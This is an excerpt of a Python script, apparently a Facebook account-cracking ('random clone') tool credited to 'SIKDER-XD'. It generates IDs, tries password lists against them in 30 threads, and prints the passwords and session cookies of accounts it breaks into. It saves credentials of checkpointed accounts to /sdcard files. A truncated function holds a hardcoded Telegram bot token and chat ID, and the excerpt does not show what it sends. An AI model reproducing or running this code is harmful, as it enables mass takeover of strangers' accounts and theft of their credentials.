...
for xd in range(10000):
	...
	ugen.append(uakua)
#os.system('xdg-open https://www.facebook.com/ITX.AK.ABDULLHA')
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2;)FB Clone 🔰🛠️SIKDER-XD💚🥀(☠️)\x07')
logo = ("""
...
$$ | \$$\ $$$$$$\ $$ | \$$ |\$$$$$$  |
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [] AUTHOR    \033[1;91m: \033[1;92mSIKDER-XD                    ┃
 ┃ [] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE                ┃
 ┃ [] STATUS    \033[1;91m: \033[1;92mFREE                        ┃
 ┃ [] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                 ┃
 ┃ [] GITHUB    \033[1;91m: \033[1;92mSIKDER-XD                ┃
 ┃ [] FACEBOOK  \033[1;91m: \033[1;92mSIKDER-XD                    ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def num():
    ...
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 30000, 50000, 99999, 999999 ')
    ...
    print(' [+] Ids saved in SIKDER-XD-ok.txt,SIKDER-XD-cp.txt')
...
def gml():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            ...
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in SIKDER-ok.txt,SIKDER-cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[SIKDER-XD]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SIKDER-XD-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SIKDER-XD-CP💔] {uid}|{ps}")
                open('/sdcard/SIKDER-XD-cp.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[SIKDER-XD] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def suyaib():
    ...
    bot_token = '7194168172:AAFd-gMNkIn5eGEOi4cqYsp5D58CkUVYI6U' 
    chat_id = '6233763737'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
